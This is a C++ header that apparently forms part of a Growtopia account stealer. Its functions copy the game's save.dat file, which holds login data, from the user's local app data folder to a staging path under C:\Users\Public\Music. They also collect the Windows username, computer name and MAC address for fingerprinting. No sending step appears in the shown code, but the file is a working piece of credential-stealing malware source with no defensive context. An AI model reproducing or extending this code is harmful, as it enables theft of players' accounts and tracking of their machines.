#pragma once
#include <Iphlpapi.h>
#include <string>
#include <fstream>

const char* temp_path = "C:\\Users\\Public\\Music\\save.dat";

void copyfile() {

    size_t sizem = 0;
    char* amts = nullptr;
    _dupenv_s(&amts, &sizem, "LOCALAPPDATA");

    if (amts != nullptr) {
      std::string f_path = std::string(amts) + "\\Growtopia\\save.dat";
        std::ifstream file(f_path, std::ios::binary);
        if (file.is_open()) {
            std::string dontbeskid((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();
            std::ofstream ametsa(temp_path);
            if (ametsa.is_open()) {
                ametsa << dontbeskid;
                ametsa.close();
            }
        }
    }
    free(amts);
}

std::string getCOMP() {
    std::string utt = "", surr = "";
    char* usto = nullptr, * notto = nullptr;
    size_t leon, seon;
    errno_t err = _dupenv_s(&usto, &leon, "USERNAME"), nott = _dupenv_s(&notto, &seon, "COMPUTERNAME");
    if (err == 0 && usto != nullptr) {
        utt = usto;
        free(const_cast<char*>(usto));
    }
    if (nott == 0 && notto != nullptr) {
        surr = notto;
        free(const_cast<char*>(notto));
    }
    return utt + " / " + surr;
}

std::string getMC() {

    IP_ADAPTER_ADDRESSES ainfo[64];
    DWORD len = sizeof(ainfo);
    auto status = GetAdaptersAddresses(2, 0, NULL, ainfo, &len);
    if (status == ERROR_BUFFER_OVERFLOW)
        return "undefined";
    auto info = ainfo;
    while (info) {
        if (info->PhysicalAddressLength) {
            for (auto j = info->FirstUnicastAddress; j; j = j->Next) {
                if (j && (void*)&j->Address) {
                    if (j->Address.lpSockaddr && j->Address.lpSockaddr->sa_family == 2) {
                        auto address = info->PhysicalAddress;
                        char buffer[18];
                        sprintf_s(buffer, "%02X:%02X:%02X:%02X:%02X:%02X", address[0], address[1], address[2], address[3], address[4], address[5]);
                        return std::string(buffer);
                    }
                }
            }
        }
        info = info->Next;
    }
    return "undefined";
}